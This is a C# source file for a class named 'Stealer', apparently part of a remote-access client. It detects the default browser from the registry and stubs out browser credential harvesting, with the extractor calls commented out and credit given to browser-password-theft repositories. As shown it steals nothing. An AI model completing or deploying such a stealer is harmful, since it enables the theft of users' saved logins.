using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client_side
{
    internal class Stealer
    {
        // Source:
        // https://github.com/LimerBoy/FireFox-Thief/
        // https://github.com/simpleperson123/ChromeDecryptor/

        private static readonly string[] Browser =
        {
            "Google Chrome",
            "Mozilla Firefox",
            "Microsoft Edge",
        };

        private static int IdentifyUserBrowser()
        {
            // Identify the default browser
            string defaultBrowser = Microsoft.Win32.Registry.GetValue(@"HKEY_CLASSES_ROOT\http\shell\open\command", null, null).ToString();
            if (defaultBrowser.Contains("chrome"))
            {
                return 1;
            }
            else if (defaultBrowser.Contains("firefox"))
            {
                return 2;
            }
            else if (defaultBrowser.Contains("edge"))
            {
                return 3;
            }
            return 0;
        }

        public static List<string> GetCredentials()
        {
            List<string> credentials = new();
            //switch (IdentifyUserBrowser())
            //{
            //    case 1:
            //        credentials.AddRange(Chrome.GetCredentials());
            //        break;
            //    case 2:
            //        credentials.AddRange(Firefox.GetCredentials());
            //        break;
            //    case 3:
            //        credentials.AddRange(Edge.GetCredentials());
            //        break;
            //}
            return credentials;
        }


    }
}
